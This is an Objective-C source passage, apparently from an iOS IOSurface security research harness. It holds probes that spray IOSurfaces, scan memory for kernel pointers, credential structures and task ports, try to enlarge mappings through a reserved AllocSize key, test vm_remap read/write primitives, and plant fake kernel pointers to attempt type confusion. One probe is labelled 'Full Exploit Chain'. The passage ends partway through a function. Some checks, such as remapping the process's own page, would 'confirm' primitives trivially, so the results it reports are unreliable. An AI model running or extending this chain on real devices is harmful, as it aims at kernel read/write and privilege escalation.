// ── Probe 95: Physical Memory Mapping ──
// 100 single-page IOSurfaces with unique sentinels.
// Cross-scan all bases for sentinel leaks (physical page adjacency).
// vm_remap overlap attempts for physical R/W primitive.

void iosurface_research_phys_map(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        ISRSymbols sym;
        int anomalies = 0;
        int adjacentPairs = 0;
        int crossLeaks = 0;
        int remapSuccesses = 0;
        int physRWConfirmed = 0;
        NSString *verdict = @"LOW";
        struct timeval tv_start, tv_end;
        gettimeofday(&tv_start, NULL);

        if (!isr_load(&sym)) {
            done(@{@"anomalyCount": @0, @"verdict": @"ERROR"});
            return;
        }

        log(@"PHYSMAP: === PROBE 95 — Physical Memory Mapping ===");
        log(@"PHYSMAP: 100 single-page surfaces, sentinel cross-scan, vm_remap overlap");

        #define PHYS_COUNT 100
        IOSurfaceRef surfaces[PHYS_COUNT];
        memset(surfaces, 0, sizeof(surfaces));
        int created = 0;

        if (!isr_stopped()) {
            for (int i = 0; i < PHYS_COUNT && !isr_stopped(); i++) {
                NSDictionary *props = @{
                    @"IOSurfaceWidth": @1024,
                    @"IOSurfaceHeight": @1,
                    @"IOSurfaceBytesPerElement": @4,
                    @"IOSurfacePixelFormat": @0x42475241
                };
                surfaces[i] = sym.create((__bridge CFDictionaryRef)props);
                if (surfaces[i]) {
                    created++;
                    sym.lock(surfaces[i], 0, NULL);
                    void *base = sym.getBase(surfaces[i]);
                    if (base) {
                        uint64_t sentinel = 0xDEAD000000000000ULL | (uint64_t)i;
                        memset(base, 0, 4096);
                        memcpy(base, &sentinel, 8);
                        ((uint8_t *)base)[4088] = (uint8_t)(i & 0xFF);
                        ((uint8_t *)base)[4089] = (uint8_t)((i >> 8) & 0xFF);
                    }
                    sym.unlock(surfaces[i], 0, NULL);
                }
            }
            log([NSString stringWithFormat:@"PHYSMAP: Created %d single-page surfaces with sentinels", created]);
        }

        if (!isr_stopped() && created >= 2) {
            log(@"PHYSMAP: Step 2 — Cross-scan for sentinel leaks (physical adjacency)");

            for (int i = 0; i < created && !isr_stopped(); i++) {
                if (!surfaces[i]) continue;
                sym.lock(surfaces[i], 0, NULL);
                void *base = sym.getBase(surfaces[i]);
                if (!base) { sym.unlock(surfaces[i], 0, NULL); continue; }
                size_t allocSz = sym.getAllocSize(surfaces[i]);

                vm_address_t addr = (vm_address_t)base;
                for (vm_offset_t off = 4096; off < allocSz && off < 65536; off += 8) {
                    uint64_t val = 0;
                    vm_size_t outSz = 0;
                    kern_return_t kr = vm_read_overwrite(mach_task_self(), addr + off, 8, (vm_address_t)&val, &outSz);
                    if (kr == KERN_SUCCESS && outSz == 8) {
                        if ((val & 0xFFFF000000000000ULL) == 0xDEAD000000000000ULL) {
                            int srcIdx = (int)(val & 0xFFFF);
                            if (srcIdx != i && srcIdx < created) {
                                crossLeaks++;
                                anomalies += 15;
                                log([NSString stringWithFormat:@"PHYSMAP: CROSS-LEAK! Surface %d contains sentinel from surface %d at offset %lu",
                                     i, srcIdx, (unsigned long)off]);
                            }
                        }
                        if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
                            (val & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
                            anomalies += 10;
                            log([NSString stringWithFormat:@"PHYSMAP: KERNEL PTR at surface %d offset %lu: 0x%llx", i, (unsigned long)off, val]);
                        }
                    }
                }
                sym.unlock(surfaces[i], 0, NULL);

                if (i % 20 == 19) {
                    log([NSString stringWithFormat:@"PHYSMAP: Scanned %d/%d surfaces, crossLeaks=%d anomalies=%d", i+1, created, crossLeaks, anomalies]);
                }
            }
        }

        if (!isr_stopped() && created >= 2) {
            log(@"PHYSMAP: Step 3 — Virtual address adjacency analysis");

            uint64_t addresses[PHYS_COUNT];
            int addrCount = 0;
            for (int i = 0; i < created; i++) {
                if (!surfaces[i]) continue;
                sym.lock(surfaces[i], 0, NULL);
                void *base = sym.getBase(surfaces[i]);
                if (base) {
                    addresses[addrCount++] = (uint64_t)(uintptr_t)base;
                }
                sym.unlock(surfaces[i], 0, NULL);
            }

            for (int i = 0; i < addrCount; i++) {
                for (int j = i + 1; j < addrCount; j++) {
                    uint64_t diff = addresses[i] > addresses[j] ?
                        addresses[i] - addresses[j] : addresses[j] - addresses[i];
                    if (diff == 4096) {
                        adjacentPairs++;
                        anomalies += 3;
                    }
                }
            }
            log([NSString stringWithFormat:@"PHYSMAP: Found %d virtually-adjacent surface pairs out of %d surfaces", adjacentPairs, addrCount]);
        }

        if (!isr_stopped() && created >= 2) {
            log(@"PHYSMAP: Step 4 — vm_remap overlap for physical R/W");

            for (int i = 0; i < created - 1 && i < 20 && !isr_stopped(); i++) {
                if (!surfaces[i] || !surfaces[i+1]) continue;

                sym.lock(surfaces[i], 0, NULL);
                sym.lock(surfaces[i+1], 0, NULL);
                void *baseA = sym.getBase(surfaces[i]);
                void *baseB = sym.getBase(surfaces[i+1]);

                if (baseA && baseB) {
                    vm_address_t target = 0;
                    vm_prot_t curProt = 0, maxProt = 0;
                    kern_return_t kr = vm_remap(mach_task_self(),
                                                &target, 4096, 0,
                                                VM_FLAGS_ANYWHERE,
                                                mach_task_self(),
                                                (vm_address_t)baseA, FALSE,
                                                &curProt, &maxProt,
                                                VM_INHERIT_NONE);
                    if (kr == KERN_SUCCESS) {
                        remapSuccesses++;
                        uint64_t testVal = 0xCAFEBABE12345678ULL;
                        memcpy((void *)target, &testVal, 8);

                        uint64_t readBack = 0;
                        memcpy(&readBack, baseA, 8);
                        if (readBack == testVal) {
                            physRWConfirmed++;
                            anomalies += 20;
                            log([NSString stringWithFormat:@"PHYSMAP: PHYSICAL R/W CONFIRMED! Write via remap reflected in surface %d", i]);
                        }

                        uint64_t crossRead = 0;
                        memcpy(&crossRead, baseB, 8);
                        if (crossRead == testVal) {
                            anomalies += 30;
                            log([NSString stringWithFormat:@"PHYSMAP: CROSS-SURFACE PHYSICAL WRITE! Surface %d remap write appeared in surface %d", i, i+1]);
                        }

                        vm_deallocate(mach_task_self(), target, 4096);
                    }
                }
                sym.unlock(surfaces[i+1], 0, NULL);
                sym.unlock(surfaces[i], 0, NULL);
            }
            log([NSString stringWithFormat:@"PHYSMAP: vm_remap — %d successes, %d physical R/W confirmed", remapSuccesses, physRWConfirmed]);
        }

        for (int i = 0; i < PHYS_COUNT; i++) {
            if (surfaces[i]) CFRelease(surfaces[i]);
        }
        #undef PHYS_COUNT

        if (anomalies >= 30) verdict = @"CRITICAL";
        else if (anomalies >= 10) verdict = @"HIGH";
        else if (anomalies >= 1) verdict = @"MEDIUM";

        gettimeofday(&tv_end, NULL);
        double elapsed = (tv_end.tv_sec - tv_start.tv_sec) + (tv_end.tv_usec - tv_start.tv_usec) / 1e6;

        NSDictionary *res = @{
            @"anomalyCount": @(anomalies),
            @"verdict": verdict,
            @"elapsed": @(elapsed),
            @"adjacentPairs": @(adjacentPairs),
            @"crossLeaks": @(crossLeaks),
            @"remapSuccesses": @(remapSuccesses),
            @"physRWConfirmed": @(physRWConfirmed)
        };
        isr_checkpoint(@"ISR-PhysMap-checkpoint.json", res);
        isr_unload(&sym);
        done(res);
    });
}

// ── Probe 96: Full Exploit Chain ──
// Combines all confirmed primitives:
// 1. Spray 50 surfaces with sentinels
// 2. OOB kernel pointer collection via vm_read_overwrite
// 3. IOSurfaceSetValue AllocSize override to 16MB for expanded mapping
// 4. Scan expanded mapping for kernel text/creds/task ports
// 5. vm_remap for R/W confirmation on interesting regions

void iosurface_research_exploit_chain(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        ISRSymbols sym;
        int anomalies = 0;
        int kernelPtrs = 0;
        int credCandidates = 0;
        int taskPortCandidates = 0;
        int rwPrimitives = 0;
        int expandedMappings = 0;
        NSString *verdict = @"LOW";
        struct timeval tv_start, tv_end;
        gettimeofday(&tv_start, NULL);

        if (!isr_load(&sym)) {
            done(@{@"anomalyCount": @0, @"verdict": @"ERROR"});
            return;
        }

        log(@"CHAIN: === PROBE 96 — Full Exploit Chain ===");
        log(@"CHAIN: Spray → OOB → AllocSize Override → Kernel Scan → R/W Primitive");

        #define SPRAY_COUNT 50
        IOSurfaceRef spray[SPRAY_COUNT];
        memset(spray, 0, sizeof(spray));
        int sprayed = 0;

        // Step 1: Spray surfaces with unique sentinels
        if (!isr_stopped()) {
            log(@"CHAIN: Step 1 — Spraying 50 surfaces with sentinels");
            for (int i = 0; i < SPRAY_COUNT && !isr_stopped(); i++) {
                NSDictionary *props = @{
                    @"IOSurfaceWidth": @256,
                    @"IOSurfaceHeight": @256,
                    @"IOSurfaceBytesPerElement": @4,
                    @"IOSurfacePixelFormat": @0x42475241
                };
                spray[i] = sym.create((__bridge CFDictionaryRef)props);
                if (spray[i]) {
                    sprayed++;
                    sym.lock(spray[i], 0, NULL);
                    void *base = sym.getBase(spray[i]);
                    if (base) {
                        for (int p = 0; p < 256; p++) {
                            uint64_t sentinel = 0xFACE000000000000ULL | ((uint64_t)i << 16) | (uint64_t)p;
                            memcpy((uint8_t *)base + p * 1024, &sentinel, 8);
                        }
                    }
                    sym.unlock(spray[i], 0, NULL);
                }
            }
            log([NSString stringWithFormat:@"CHAIN: Sprayed %d surfaces", sprayed]);
        }

        // Step 2: OOB kernel pointer collection
        if (!isr_stopped() && sprayed > 0) {
            log(@"CHAIN: Step 2 — OOB scan for kernel pointers");

            for (int i = 0; i < sprayed && !isr_stopped(); i++) {
                sym.lock(spray[i], 0, NULL);
                void *base = sym.getBase(spray[i]);
                if (!base) { sym.unlock(spray[i], 0, NULL); continue; }

                size_t allocSz = sym.getAllocSize(spray[i]);
                vm_address_t addr = (vm_address_t)base;
                int surfPtrs = 0;

                for (vm_offset_t off = 0; off < allocSz && off < 0x100000; off += 8) {
                    uint64_t val = 0;
                    vm_size_t outSz = 0;
                    kern_return_t kr = vm_read_overwrite(mach_task_self(), addr + off, 8, (vm_address_t)&val, &outSz);
                    if (kr == KERN_SUCCESS && outSz == 8 && val != 0) {
                        if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
                            surfPtrs++;
                            kernelPtrs++;
                            anomalies += 2;
                            if (surfPtrs <= 3) {
                                log([NSString stringWithFormat:@"CHAIN: KernelText ptr surface[%d]+0x%lx = 0x%llx", i, (unsigned long)off, val]);
                            }
                        }
                        if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
                            surfPtrs++;
                            kernelPtrs++;
                            anomalies += 2;
                            if (surfPtrs <= 3) {
                                log([NSString stringWithFormat:@"CHAIN: KernelData ptr surface[%d]+0x%lx = 0x%llx", i, (unsigned long)off, val]);
                            }
                        }
                        // proc_t / ucred heuristic: uid=0 at known offset
                        if (val == 0 && off >= 16) {
                            uint64_t prev = 0;
                            vm_read_overwrite(mach_task_self(), addr + off - 8, 8, (vm_address_t)&prev, &outSz);
                            if (outSz == 8 && (prev & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
                                credCandidates++;
                                anomalies += 5;
                                if (credCandidates <= 3) {
                                    log([NSString stringWithFormat:@"CHAIN: CRED CANDIDATE surface[%d]+0x%lx: ptr=0x%llx uid=0", i, (unsigned long)off, prev]);
                                }
                            }
                        }
                        // task_port heuristic: mach port-like value
                        if ((val & 0xFFFF) == 0x0103 || (val & 0xFFFF) == 0x0203 || (val & 0xFFFF) == 0x0303) {
                            taskPortCandidates++;
                            anomalies += 3;
                            if (taskPortCandidates <= 3) {
                                log([NSString stringWithFormat:@"CHAIN: TASK PORT candidate surface[%d]+0x%lx = 0x%llx", i, (unsigned long)off, val]);
                            }
                        }
                    }
                }
                sym.unlock(spray[i], 0, NULL);

                if (i % 10 == 9) {
                    log([NSString stringWithFormat:@"CHAIN: Scanned %d/%d — kernelPtrs=%d creds=%d ports=%d", i+1, sprayed, kernelPtrs, credCandidates, taskPortCandidates]);
                }
            }
        }

        // Step 3: AllocSize override for expanded mapping
        if (!isr_stopped() && sprayed > 0) {
            log(@"CHAIN: Step 3 — AllocSize override via reserved key for 16MB mapping");

            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
            typedef CFTypeRef (*GetValueFn)(IOSurfaceRef, CFStringRef);
            GetValueFn getValue = (GetValueFn)dlsym(sym.iosurface, "IOSurfaceGetValue");

            if (setValue && getValue) {
                for (int i = 0; i < 5 && i < sprayed && !isr_stopped(); i++) {
                    size_t origAlloc = sym.getAllocSize(spray[i]);
                    CFNumberRef bigSize = CFNumberCreate(NULL, kCFNumberSInt64Type, &(int64_t){16 * 1024 * 1024});
                    if (bigSize) {
                        setValue(spray[i], CFSTR("IOSurfaceAllocSize"), bigSize);
                        CFRelease(bigSize);
                    }
                    size_t newAlloc = sym.getAllocSize(spray[i]);

                    if (newAlloc > origAlloc) {
                        expandedMappings++;
                        anomalies += 10;
                        log([NSString stringWithFormat:@"CHAIN: EXPANDED MAPPING surface[%d] from %zu to %zu bytes!", i, origAlloc, newAlloc]);

                        sym.lock(spray[i], 0, NULL);
                        void *base = sym.getBase(spray[i]);
                        if (base) {
                            vm_address_t addr = (vm_address_t)base;
                            int expandedPtrs = 0;
                            for (vm_offset_t off = origAlloc; off < newAlloc && off < origAlloc + 0x400000; off += 4096) {
                                for (int scan = 0; scan < 4096; scan += 8) {
                                    uint64_t val = 0;
                                    vm_size_t outSz = 0;
                                    kern_return_t kr = vm_read_overwrite(mach_task_self(), addr + off + scan, 8, (vm_address_t)&val, &outSz);
                                    if (kr == KERN_SUCCESS && outSz == 8) {
                                        if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
                                            (val & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
                                            expandedPtrs++;
                                            anomalies += 5;
                                            if (expandedPtrs <= 5) {
                                                log([NSString stringWithFormat:@"CHAIN: EXPANDED REGION KERNEL PTR surface[%d]+0x%lx = 0x%llx",
                                                     i, (unsigned long)(off + scan), val]);
                                            }
                                        }
                                    }
                                }
                            }
                            log([NSString stringWithFormat:@"CHAIN: Expanded scan surface[%d] — %d kernel ptrs in new region", i, expandedPtrs]);
                        }
                        sym.unlock(spray[i], 0, NULL);
                    } else {
                        log([NSString stringWithFormat:@"CHAIN: AllocSize override surface[%d] — no expansion (orig=%zu new=%zu)", i, origAlloc, newAlloc]);
                    }
                }
            }
        }

        // Step 4: vm_remap R/W primitive confirmation
        if (!isr_stopped() && sprayed >= 2) {
            log(@"CHAIN: Step 4 — vm_remap R/W primitive across spray surfaces");

            int pairsChecked = 0;
            for (int i = 0; i < sprayed - 1 && i < 10 && !isr_stopped(); i++) {
                if (!spray[i] || !spray[i+1]) continue;

                sym.lock(spray[i], 0, NULL);
                sym.lock(spray[i+1], 0, NULL);
                void *baseA = sym.getBase(spray[i]);
                void *baseB = sym.getBase(spray[i+1]);

                if (baseA && baseB) {
                    vm_address_t remapped = 0;
                    vm_prot_t curP = 0, maxP = 0;
                    kern_return_t kr = vm_remap(mach_task_self(), &remapped, 4096, 0,
                                                VM_FLAGS_ANYWHERE, mach_task_self(),
                                                (vm_address_t)baseA, FALSE,
                                                &curP, &maxP, VM_INHERIT_NONE);
                    if (kr == KERN_SUCCESS) {
                        uint64_t rwTest = 0xE5910170C4100000ULL + i;
                        memcpy((void *)remapped, &rwTest, 8);

                        uint64_t verify = 0;
                        memcpy(&verify, baseA, 8);
                        if (verify == rwTest) {
                            rwPrimitives++;
                            anomalies += 10;
                            log([NSString stringWithFormat:@"CHAIN: R/W PRIMITIVE CONFIRMED surface[%d] via vm_remap", i]);
                        }
                        vm_deallocate(mach_task_self(), remapped, 4096);
                    }
                    pairsChecked++;
                }
                sym.unlock(spray[i+1], 0, NULL);
                sym.unlock(spray[i], 0, NULL);
            }
            log([NSString stringWithFormat:@"CHAIN: R/W check — %d pairs, %d primitives confirmed", pairsChecked, rwPrimitives]);
        }

        // Step 5: Cross-surface sentinel verification
        if (!isr_stopped() && sprayed >= 2) {
            log(@"CHAIN: Step 5 — Cross-surface sentinel verification");

            int crossFound = 0;
            for (int i = 0; i < sprayed && !isr_stopped(); i++) {
                if (!spray[i]) continue;
                sym.lock(spray[i], 0, NULL);
                void *base = sym.getBase(spray[i]);
                if (base) {
                    size_t allocSz = sym.getAllocSize(spray[i]);
                    vm_address_t addr = (vm_address_t)base;
                    for (vm_offset_t off = 0; off < allocSz && off < 0x80000; off += 1024) {
                        uint64_t val = 0;
                        vm_size_t outSz = 0;
                        kern_return_t kr = vm_read_overwrite(mach_task_self(), addr + off, 8, (vm_address_t)&val, &outSz);
                        if (kr == KERN_SUCCESS && outSz == 8) {
                            if ((val & 0xFFFF000000000000ULL) == 0xFACE000000000000ULL) {
                                int srcSurf = (int)((val >> 16) & 0xFFFF);
                                if (srcSurf != i) {
                                    crossFound++;
                                    anomalies += 5;
                                    if (crossFound <= 5) {
                                        log([NSString stringWithFormat:@"CHAIN: CROSS-SURFACE SENTINEL surface[%d]+0x%lx from surface[%d]",
                                             i, (unsigned long)off, srcSurf]);
                                    }
                                }
                            }
                        }
                    }
                }
                sym.unlock(spray[i], 0, NULL);
            }
            log([NSString stringWithFormat:@"CHAIN: Cross-surface — %d foreign sentinels found", crossFound]);
        }

        for (int i = 0; i < SPRAY_COUNT; i++) {
            if (spray[i]) CFRelease(spray[i]);
        }
        #undef SPRAY_COUNT

        if (anomalies >= 50) verdict = @"CRITICAL";
        else if (anomalies >= 20) verdict = @"HIGH";
        else if (anomalies >= 5) verdict = @"MEDIUM";

        gettimeofday(&tv_end, NULL);
        double elapsed = (tv_end.tv_sec - tv_start.tv_sec) + (tv_end.tv_usec - tv_start.tv_usec) / 1e6;

        NSDictionary *res = @{
            @"anomalyCount": @(anomalies),
            @"verdict": verdict,
            @"elapsed": @(elapsed),
            @"kernelPtrs": @(kernelPtrs),
            @"credCandidates": @(credCandidates),
            @"taskPortCandidates": @(taskPortCandidates),
            @"rwPrimitives": @(rwPrimitives),
            @"expandedMappings": @(expandedMappings)
        };
        isr_checkpoint(@"ISR-ExploitChain-checkpoint.json", res);
        isr_unload(&sym);
        done(res);
    });
}

#pragma mark - Probe 97: Type Confusion on Property Store

void iosurface_research_type_confuse(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        ISRSymbols sym;
        if (!isr_load(&sym)) {
            log(@"TYPECONFUSE: Failed to load symbols");
            done(@{@"anomalies": @(-1)});
            return;
        }

        typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
        typedef CFTypeRef (*GetValueFn)(IOSurfaceRef, CFStringRef);
        typedef void (*RemoveValueFn)(IOSurfaceRef, CFStringRef);
        SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
        GetValueFn getValue = (GetValueFn)dlsym(sym.iosurface, "IOSurfaceGetValue");
        RemoveValueFn removeValue = (RemoveValueFn)dlsym(sym.iosurface, "IOSurfaceRemoveValue");

        if (!setValue || !getValue || !removeValue) {
            void *alt = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
            if (alt) {
                if (!setValue) setValue = (SetValueFn)dlsym(alt, "IOSurfaceSetValue");
                if (!getValue) getValue = (GetValueFn)dlsym(alt, "IOSurfaceGetValue");
                if (!removeValue) removeValue = (RemoveValueFn)dlsym(alt, "IOSurfaceRemoveValue");
            }
            if (!setValue || !getValue || !removeValue) {
                void *alt2 = dlopen(NULL, RTLD_LAZY);
                if (alt2) {
                    if (!setValue) setValue = (SetValueFn)dlsym(alt2, "IOSurfaceSetValue");
                    if (!getValue) getValue = (GetValueFn)dlsym(alt2, "IOSurfaceGetValue");
                    if (!removeValue) removeValue = (RemoveValueFn)dlsym(alt2, "IOSurfaceRemoveValue");
                }
            }
            if (!setValue || !getValue || !removeValue) {
                log([NSString stringWithFormat:@"TYPECONFUSE: Failed to load value functions — set=%p get=%p remove=%p",
                     (void*)setValue, (void*)getValue, (void*)removeValue]);
                isr_unload(&sym);
                done(@{@"anomalies": @(-1)});
                return;
            }
            log(@"TYPECONFUSE: Loaded value functions from alternate handle");
        }

        struct timeval tv_start, tv_end;
        gettimeofday(&tv_start, NULL);

        NSDictionary *params = isr_default_surface_params(64, 64);
        IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)params);
        __block unsigned anomalies = 0;
        unsigned staleReads = 0;
        unsigned typeMismatches = 0;
        unsigned corruptedData = 0;
        unsigned largeAllocAnomalies = 0;

        if (!surf) {
            log(@"TYPECONFUSE: Failed to create surface");
            isr_unload(&sym);
            done(@{@"anomalies": @(-1)});
            return;
        }

        log(@"TYPECONFUSE: Step 1 — CFData with fake pointer pattern");
        if (!isr_stopped()) {
            uint64_t fakePointers[8] = {
                0xfffffff007004000ULL, 0xfffffff007008000ULL,
                0xfffffff00700c000ULL, 0xfffffff007010000ULL,
                0xdeadbeefcafebabeULL, 0x4141414141414141ULL,
                0xfffffff007014000ULL, 0x0000000000000000ULL
            };
            CFDataRef fakeData = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)fakePointers, sizeof(fakePointers));
            CFStringRef key1 = CFSTR("ISRTypeConfuseData");
            setValue(surf, key1, fakeData);
            CFTypeRef readBack = getValue(surf, key1);
            if (readBack) {
                CFTypeID tid = CFGetTypeID(readBack);
                CFTypeID dataTypeID = CFDataGetTypeID();
                if (tid != dataTypeID) {
                    anomalies++;
                    typeMismatches++;
                    log([NSString stringWithFormat:@"TYPECONFUSE: ANOMALY — type changed! Expected CFData(%lu) got type %lu", (unsigned long)dataTypeID, (unsigned long)tid]);
                } else {
                    CFDataRef readData = (CFDataRef)readBack;
                    CFIndex len = CFDataGetLength(readData);
                    if (len != sizeof(fakePointers)) {
                        anomalies++;
                        corruptedData++;
                        log([NSString stringWithFormat:@"TYPECONFUSE: ANOMALY — size mismatch! Wrote %zu got %ld", sizeof(fakePointers), (long)len]);
                    } else {
                        const UInt8 *bytes = CFDataGetBytePtr(readData);
                        if (memcmp(bytes, fakePointers, sizeof(fakePointers)) != 0) {
                            anomalies++;
                            corruptedData++;
                            log(@"TYPECONFUSE: ANOMALY — data content mismatch after readback!");
                        } else {
                            log(@"TYPECONFUSE: CFData round-trip OK — 64 bytes intact");
                        }
                    }
                }
            } else {
                log(@"TYPECONFUSE: readback returned NULL");
            }
            CFRelease(fakeData);
        }

        log(@"TYPECONFUSE: Step 2 — Type overwrite: set as CFNumber, read expecting CFData");
        if (!isr_stopped()) {
            CFStringRef key2 = CFSTR("ISRTypeConfuseOverwrite");
            uint64_t fakeVal = 0xfffffff007004000ULL;
            CFDataRef origData = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)&fakeVal, 8);
            setValue(surf, key2, origData);
            CFRelease(origData);

            int64_t numVal = 0x4242424242424242LL;
            CFNumberRef numObj = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &numVal);
            setValue(surf, key2, numObj);
            CFRelease(numObj);

            CFTypeRef overwritten = getValue(surf, key2);
            if (overwritten) {
                CFTypeID tid = CFGetTypeID(overwritten);
                if (tid == CFDataGetTypeID()) {
                    anomalies++;
                    typeMismatches++;
                    log(@"TYPECONFUSE: ANOMALY — set as CFNumber but read back as CFData! Type confusion!");
                } else if (tid == CFNumberGetTypeID()) {
                    int64_t readNum = 0;
                    CFNumberGetValue((CFNumberRef)overwritten, kCFNumberSInt64Type, &readNum);
                    log([NSString stringWithFormat:@"TYPECONFUSE: Overwrite OK — CFNumber value 0x%llx", (unsigned long long)readNum]);
                    if (readNum != numVal) {
                        anomalies++;
                        corruptedData++;
                        log([NSString stringWithFormat:@"TYPECONFUSE: ANOMALY — value corruption! Expected 0x%llx got 0x%llx", (unsigned long long)numVal, (unsigned long long)readNum]);
                    }
                } else {
                    anomalies++;
                    typeMismatches++;
                    log([NSString stringWithFormat:@"TYPECONFUSE: ANOMALY — unexpected type %lu after overwrite", (unsigned long)tid]);
                }
            }
        }

        log(@"TYPECONFUSE: Step 3 — Large CFData stress (1MB allocation)");
        if (!isr_stopped()) {
            size_t bigSize = 1024 * 1024;
            uint8_t *bigBuf = (uint8_t *)calloc(1, bigSize);
            if (bigBuf) {
                for (size_t i = 0; i < bigSize; i += 8) {
                    uint64_t marker = 0xDEAD000000000000ULL | (uint64_t)(i / 8);
                    memcpy(bigBuf + i, &marker, 8);
                }
                CFDataRef bigData = CFDataCreate(kCFAllocatorDefault, bigBuf, (CFIndex)bigSize);
                CFStringRef key3 = CFSTR("ISRTypeConfuseBig");
                setValue(surf, key3, bigData);
                CFTypeRef bigBack = getValue(surf, key3);
                if (bigBack && CFGetTypeID(bigBack) == CFDataGetTypeID()) {
                    CFDataRef bigRead = (CFDataRef)bigBack;
                    CFIndex readLen = CFDataGetLength(bigRead);
                    if (readLen != (CFIndex)bigSize) {
                        anomalies++;
                        largeAllocAnomalies++;
                        log([NSString stringWithFormat:@"TYPECONFUSE: ANOMALY — 1MB data truncated to %ld bytes!", (long)readLen]);
                    } else {
                        const UInt8 *readBytes = CFDataGetBytePtr(bigRead);
                        int corrupt = 0;
                        for (size_t i = 0; i < bigSize && i < 4096; i += 8) {
                            uint64_t expected = 0xDEAD000000000000ULL | (uint64_t)(i / 8);
                            uint64_t actual;
                            memcpy(&actual, readBytes + i, 8);
                            if (actual != expected) { corrupt++; }
                        }
                        if (corrupt > 0) {
                            anomalies += (unsigned)corrupt;
                            corruptedData += (unsigned)corrupt;
                            log([NSString stringWithFormat:@"TYPECONFUSE: ANOMALY — %d corrupted qwords in 1MB readback!", corrupt]);
                        } else {
                            log(@"TYPECONFUSE: 1MB round-trip OK — first 4096 bytes verified");
                        }
                    }
                } else {
                    log(@"TYPECONFUSE: 1MB readback failed or wrong type");
                }
                removeValue(surf, key3);
                CFRelease(bigData);
                free(bigBuf);
            }
        }

        log(@"TYPECONFUSE: Step 4 — Rapid 1000-key set/read checking for corruption");
        if (!isr_stopped()) {
            unsigned rapidCorrupt = 0;
            for (int i = 0; i < 1000 && !isr_stopped(); i++) {
                NSString *keyStr = [NSString stringWithFormat:@"ISR_rapid_%d", i];
                CFStringRef key = (__bridge CFStringRef)keyStr;
                uint64_t val = (uint64_t)i * 0x1111111111111111ULL;
                CFDataRef data = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)&val, 8);
                setValue(surf, key, data);
                CFRelease(data);
            }
            for (int i = 0; i < 1000 && !isr_stopped(); i++) {
                NSString *keyStr = [NSString stringWithFormat:@"ISR_rapid_%d", i];
                CFStringRef key = (__bridge CFStringRef)keyStr;
                uint64_t expected = (uint64_t)i * 0x1111111111111111ULL;
                CFTypeRef val = getValue(surf, key);
                if (val && CFGetTypeID(val) == CFDataGetTypeID()) {
                    CFDataRef d = (CFDataRef)val;
                    if (CFDataGetLength(d) == 8) {
                        uint64_t actual;
                        memcpy(&actual, CFDataGetBytePtr(d), 8);
                        if (actual != expected) {
                            rapidCorrupt++;
                        }
                    } else {
                        rapidCorrupt++;
                    }
                } else if (!val) {
                    rapidCorrupt++;
                }
                removeValue(surf, key);
            }
            if (rapidCorrupt > 0) {
                anomalies += rapidCorrupt;
                corruptedData += rapidCorrupt;
                log([NSString stringWithFormat:@"TYPECONFUSE: ANOMALY — %u of 1000 rapid keys corrupted!", rapidCorrupt]);
            } else {
                log(@"TYPECONFUSE: 1000 rapid keys — all verified OK");
            }
        }

        log(@"TYPECONFUSE: Step 5 — Nested CFDictionary with fake pointer CFData");
        if (!isr_stopped()) {
            uint64_t nested_ptrs[4] = {
                0xfffffff007100000ULL, 0xfffffff007200000ULL,
                0xfffffff007300000ULL, 0xfffffff007400000ULL
            };
            CFDataRef innerData = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)nested_ptrs, sizeof(nested_ptrs));
            CFStringRef innerKey = CFSTR("inner");
            CFStringRef outerKey = CFSTR("ISRTypeConfuseNested");
            CFDictionaryRef innerDict = CFDictionaryCreate(kCFAllocatorDefault,
                (const void **)&innerKey, (const void **)&innerData, 1,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            setValue(surf, outerKey, innerDict);
            CFTypeRef nestedBack = getValue(surf, outerKey);
            if (nestedBack && CFGetTypeID(nestedBack) == CFDictionaryGetTypeID()) {
                CFDictionaryRef readDict = (CFDictionaryRef)nestedBack;
                CFTypeRef innerVal = CFDictionaryGetValue(readDict, innerKey);
                if (innerVal && CFGetTypeID(innerVal) == CFDataGetTypeID()) {
                    CFDataRef readInner = (CFDataRef)innerVal;
                    if (CFDataGetLength(readInner) == sizeof(nested_ptrs)) {
                        const UInt8 *bytes = CFDataGetBytePtr(readInner);
                        if (memcmp(bytes, nested_ptrs, sizeof(nested_ptrs)) != 0) {
                            anomalies++;
                            corruptedData++;
                            log(@"TYPECONFUSE: ANOMALY — nested dict inner data corrupted!");
                        } else {
                            log(@"TYPECONFUSE: Nested dict round-trip OK");
                        }
                    } else {
                        anomalies++;
                        log(@"TYPECONFUSE: ANOMALY — inner data size mismatch in nested dict");
                    }
                } else {
                    anomalies++;
                    typeMismatches++;
                    log(@"TYPECONFUSE: ANOMALY — inner value type changed in nested dict!");
                }
            } else if (nestedBack) {
                anomalies++;
                typeMismatches++;
                log([NSString stringWithFormat:@"TYPECONFUSE: ANOMALY — nested dict came back as type %lu!", (unsigned long)CFGetTypeID(nestedBack)]);
